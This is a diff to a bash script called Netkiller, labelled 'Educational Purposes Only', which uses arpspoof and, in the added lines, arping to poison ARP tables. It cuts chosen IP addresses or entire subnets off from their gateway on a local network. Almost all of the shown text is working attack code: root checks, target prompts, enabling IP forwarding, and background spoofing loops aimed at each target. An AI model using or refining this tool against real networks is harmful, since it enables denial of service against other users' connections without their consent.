@@ -2,7 +2,7 @@
 
 # Made by Xiv3r
 # ARP Spoofing Internet Blocker (Educational Purposes Only)
-# Requires: dsniff, ipcalc, and root privileges
+# Requires: dsniff, arping, ipcalc, and root privileges
 
 # Check if script is running as root
 if [[ $EUID -ne 0 ]]; then
@@ -12,7 +12,7 @@ if [[ $EUID -ne 0 ]]; then
 fi
 
 # Check for required tools
-REQUIRED_TOOLS=("dsniff" "ipcalc")
+REQUIRED_TOOLS=("dsniff" "arping" "ipcalc")
 
 for tool in "${REQUIRED_TOOLS[@]}"; do
     if ! command -v "$tool" &> /dev/null; then
@@ -39,13 +39,13 @@ INTERFACE="${WLN:-$WLAN}"
 echo ""
 
 # Detect Gateway IP
-echo "Enter Router Gateway IP: Enter for default"
+echo "Enter Target Gateway: Enter for default"
 read -p "> $GW " INET
 GATEWAY="${INET:-$GW}"
 echo ""
 
 # Detect Target IPs or CIDR
-echo "Enter Target IP(s) or CIDR (space or comma-separated, e.g., 10.0.0.123 10.0.0.124 or 192.168.1.0/24):"
+echo "Enter Target IP (e.g., 10.0.0.123 10.0.0.124 or 10.0.0.0/20)"
 read -p "> " IPS
 # If no input, prompt again or exit
 if [ -z "$IPS" ]; then
@@ -74,11 +74,12 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 cat > /bin/netkiller-stop << EOF
 #!/bin/sh
 
-sudo ip -s -s neigh flush all >/dev/null
+sudo ip -s -s neigh flush all
+sudo pkill -f arping
 sudo pkill -f arpspoof
 echo "Netkiller is stopped!"
 sleep 2s
-echo "Restoring the client connections..."
+echo "Restoring the users connections..."
 EOF
 sudo chmod 755 /bin/netkiller-stop
 
@@ -149,6 +150,7 @@ for TARGET in $TARGET_IPS; do
         # Bidirectional ARP Spoofing
         sudo arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 &
         sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" -r "$TARGET" >/dev/null 2>&1 &
+        sudo arping -b -A -i "$INTERFACE" -S "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
     ) &
     echo "Netkiller killing the target IP: $TARGET"
 done
